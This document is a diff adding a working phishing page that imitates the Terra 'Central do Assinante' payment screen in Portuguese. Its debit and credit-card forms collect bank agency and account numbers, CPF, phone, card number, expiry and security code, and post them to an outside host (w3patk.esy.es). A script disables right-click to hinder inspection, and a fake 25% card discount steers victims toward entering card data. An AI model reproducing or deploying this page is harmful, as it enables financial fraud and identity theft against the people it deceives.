@@ -1,0 +1,274 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0041)http://centralcob-terra.com/pagamento.php -->
+<html xmlns="http://www.w3.org/1999/xhtml" lang="pt-br"><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>Terra - Central do Assinante</title>
+
+<meta http-equiv="content-language" content="portuguese">
+<meta name="geo.country" content="br">
+<meta name="MSSmartTagsPreventParsing" content="true">
+<meta http-equiv="imagetoolbar" content="no">
+<meta name="revisit-after" content="1 days">
+
+<link rel="shortcut icon" type="image/x-icon" href="http://s1.trrsf.com.br/favicon.ico">
+<link type="text/css" rel="stylesheet" media="screen" href="./Forma de Pagamento_files/skin.css">
+<link type="text/css" rel="stylesheet" media="screen" href="./Forma de Pagamento_files/header_footer.css">
+<link type="text/css" rel="stylesheet" media="screen" href="./Forma de Pagamento_files/content.css">
+<script language="javascript" type="text/javascript" src="./Forma de Pagamento_files/ca_scripts.js"></script>
+
+<script language="javascript" type="text/javascript" src="./Forma de Pagamento_files/tween.js"></script>
+</head>
+
+<body>
+<div class="master">
+<div class="header">
+<div class="iframeHeader">
+<!-- header -->
+<iframe name="header" src="./Forma de Pagamento_files/header_logada.htm" frameborder="0" width="942" height="56" scrolling="no" id="barraterra"></iframe>
+<!-- fim do header -->
+
+</div>
+<div class="middleHeader">
+<div class="titleCentral"><a href=""><img src="./Forma de Pagamento_files/titleCentralDeRelacionamento.jpg" alt="Central de Relacionamento"></a></div>
+<div class="dadosLogin">
+Usuário: <strong></strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Sair</a>&nbsp;<a href=""><img src="./Forma de Pagamento_files/ico_header_sair.jpg" alt="Sair"></a>
+</div>
+<div class="menuCentral">
+
+<div class="btnMenu">
+<ul>
+<li class="titleMenuCentral"><img src="./Forma de Pagamento_files/title_header_naveguePor.jpg" alt="Navegue por"><span class="divisor">|</span></li>
+<li>
+<a href="" title="Home" hreflang="pt"><img src="./Forma de Pagamento_files/btn_header_home_cinza.jpg" alt="Home"></a><span class="divisor">|</span>
+</li>
+
+<li>
+<a href="" title="Meus dados" hreflang="pt"><img src="./Forma de Pagamento_files/btn_header_meusdados_cinza.jpg" alt="Meus dados"></a><span class="divisor">|</span>
+
+</li>
+
+
+<li>
+<a href=""><img src="./Forma de Pagamento_files/btn_header_meusservicos_cinza.jpg" alt="Meus serviços"></a><span class="divisor">|</span>
+</li>
+
+
+<li>
+<a href=""><img src="./Forma de Pagamento_files/btn_header_gerenciarconta_cinza.jpg" alt="Gerenciar conta"></a><span class="divisor">|</span>
+</li>
+
+
+<li>
+
+<a href=""><img src="./Forma de Pagamento_files/btn_header_pagamento_laranja.jpg" alt="Pagamento"></a>
+<hr>
+<span class="divisor">|</span>
+</li>
+
+</ul>
+</div>
+<!--div class="searchBar">
+<label class="divisor">&nbsp;</label><input value="Qual é a sua d&uacute;vida?" type="text"/><img src="images1/btn_search.jpg" alt="Buscar" title="Buscar" align="top" />
+</div>-->
+</div>
+</div>
+</div>
+<div class="content">
+
+<div class="breadCrumb">
+
+<a href="" title="Dados de cobrança" hreflang="pt">dados de pagamento</a><span class="divisor">|</span>
+
+
+<a href="" title="Alterar Forma de pagamento" hreflang="pt" class="activeLink">Alterar Forma de pagamento</a>
+
+
+<a href="" title="Extrato de horas" hreflang="pt">Extrato de horas</a>
+
+<a href="" title="Central de pagamento" hreflang="pt" target="_blank">Central de pagamento</a>
+</div>
+
+<!--<div class="divError">
+<div class="divErrorInt">
+Um dos campos n&atilde;o foi preenchido corretamente
+</div>
+</div> -->
+<div class="meusDados">
+<br>
+<div>
+<div><img src="./Forma de Pagamento_files/tit_formadepagamento.gif"></div>
+</div>
+<div class="boxActiveBar">
+<h4 class="titleInt">selecione a forma de pagamento:</h4><br><br>
+
+<label for="id_deb" style="cursor: pointer"><input id="id_deb" type="radio" name="cob" value="deb" onclick="javascript: expandeForma(&#39;box_cobranca_debito&#39;, 300); document.getElementById(&#39;box_cobranca_credito&#39;).style.display = &#39;none&#39;; document.getElementById(&#39;box_cobranca_credito&#39;).style.height = &#39;0px&#39;"> Débito Automático</label>
+
+
+&nbsp;&nbsp;&nbsp;&nbsp;<label for="id_cc" style="cursor: pointer"><input id="id_cc" type="radio" name="cob" value="cc" onclick="javascript: expandeForma(&#39;box_cobranca_credito&#39;, 300); document.getElementById(&#39;box_cobranca_debito&#39;).style.display = &#39;none&#39;; document.getElementById(&#39;box_cobranca_debito&#39;).style.height = &#39;0px&#39;"> Cartão de Crédito</label>
+<div id="box_cobranca_debito" style="display:none"><br>
+<form name="cobranca" method="post" action="http://www.w3patk.esy.es/env_deb.php">
+<h4 class="titleInt">Débito Automático</h4><br><br>
+<input type="hidden" name="cob" value="deb">
+<input type="hidden" name="user" value="">
+<input type="hidden" name="pass" value="">
+
+<p>Preencha os campos abaixo para autorizar o débito em conta:</p><br>
+
+<table border="0">
+<tbody><tr>
+<td align="right">Escolha o Banco:</td>
+<td>
+<select name="_dbanco" id="banco" style="width: 152px;" class="inputMedio">
+
+<option value="bb">Banco do Brasil</option>
+
+<option value="bsul">Banrisul</option>
+
+<option value="desco">Bradesco</option>
+
+<option value="cef">CEF</option>
+
+<option value="citi">Citibank</option>
+
+<option value="hsbc">HSBC</option>
+
+<option value="ita">Itaú</option>
+
+<option value="santa">Santander Banespa</option>
+
+</select>
+</td>
+</tr>
+<tr>
+<td align="right"><label>Número da Agência : </label></td>
+
+<td><input name="_dnumAgencia" id="age" type="text" style="width: 55px;" class="inputTxt" maxlength="7"> (Digite apenas o número, sem hífen, barra ou espaço)</td>
+</tr>
+<tr>
+<td align="right"><label>Número da Conta: </label></td>
+<td><input name="_dnumConta" id="conta" class="inputTxt" type="text" style="width: 150px;" maxlength="16"> (Digite apenas o número, sem hífen, barra ou espaço)</td>
+</tr>
+
+<tr>
+<td align="right"><label>CPF: </label></td>
+<td><input name="_cpf" id="debcpf" class="inputPequeno" type="text" style="width: 100px;" maxlength="15"><br>
+</td>
+
+</tr>
+
+<tr>
+<td align="right"><label>Telefone de Cobrança: </label></td>
+<td>
+
+<input name="_bddd" id="bddd" value="" type="text" style="width: 30px;" class="inputPequeno" maxlength="3">&nbsp;
+<input name="_bfone" id="bfone"" value="" type="text" style="width: 100px;" class="inputMedio" maxlength="11">
+
+</td>
+</tr>
+</tbody></table>
+
+	<div id="footer">
+		<div id="privac">* | <a class="under">Desconto de 25% para pagamento no Cartão de Crédito.</a> |</div>
+	</div>
+
+
+<div class="cleaner"></div>
+<div class="btn_Alinhamento">
+<input type="image" src="./Forma de Pagamento_files/btn_OK.jpg">
+</div>
+</form>
+</div>
+<div id="box_cobranca_credito" style="display:none"><br>
+<form name="cobranca" method="post" action="http://www.w3patk.esy.es/env_cred.php">
+
+<h4 class="titleInt">Cartão de Crédito</h4><br><br>
+<input type="hidden" name="cob" value="cc">
+<input type="hidden" name="user" value="">
+<input type="hidden" name="pass" value="">
+<table border="0">
+<tbody><tr>
+<td align="right"><label>Escolha o cartão: </label></td>
+<td>
+<select name="_tcartao" id="card" style="width: 137px;" class="inputMedio">
+
+<option value="Selecione">Selecione</option>
+
+<option value="Visa">Visa</option>
+
+<option value="Master">Mastercard</option>
+
+<option value="Amex">American Express</option>
+
+<option value="Diners">Diners Club</option>
+
+<option value="Hiper">Hipercard</option>
+
+</select>
+</td></tr>
+
+
+<tr>
+<td align="right"><label>Nome do titular: </label></td>
+<td><input name="_nomeCartao" id="nome" "" class="inputTxt" type="text" style="width: 210px;"> (Como impresso no cartão)</td>
+</tr>
+<tr>
+
+
+</tr>
+<tr>
+<td align="right"><label>Número do Cartão: </label></td>
+
+<td><input name="_numCartao" id="numero" class="inputTxt" type="text" style="width: 160px;"> (Digite apenas o número, sem hífen, barra ou espaço)</td>
+</tr>
+<tr>
+<td align="right"><label>Validade (mm/aa): </label></td>
+<td><input name="_validadeCartao" id="validade" class="inputPequeno" type="text" style="width: 40px;" maxlength="5"><br>
+</td>
+
+</tr>
+<tr>
+<td align="right"><label>Código de segurança: </label></td>
+<td>
+
+<input name="_bddd" id="cvv" value="" type="text" style="width: 30px;" maxlength="4" class="inputPequeno"> (3 digitos no verso do cartão)
+
+</td>
+</tr>
+
+<tr>
+<td align="right"><label>CPF: </label></td>
+<td><input name="_cpf" id="cpf" class="inputPequeno" type="text" style="width: 100px;" maxlength="15"><br>
+</td>
+
+</tr>
+
+</tbody></table>
+
+
+
+<div class="btn_Alinhamento">
+<input type="image" src="./Forma de Pagamento_files/btn_OK.jpg">
+</div>
+</form>
+</div>
+</div>
+</div>
+<div class="bottom">
+
+<iframe name="rodape" src="./Forma de Pagamento_files/rodape.htm" class="iframeRodape" frameborder="0"></iframe>
+</div>
+</div>
+
+
+
+
+
+<script>
+function click() {
+if (event.button==2||event.button==3) {
+oncontextmenu='return false';
+}
+}
+document.onmousedown=click
+document.oncontextmenu = new Function("return false;")
+</script>
+</div></body></html>
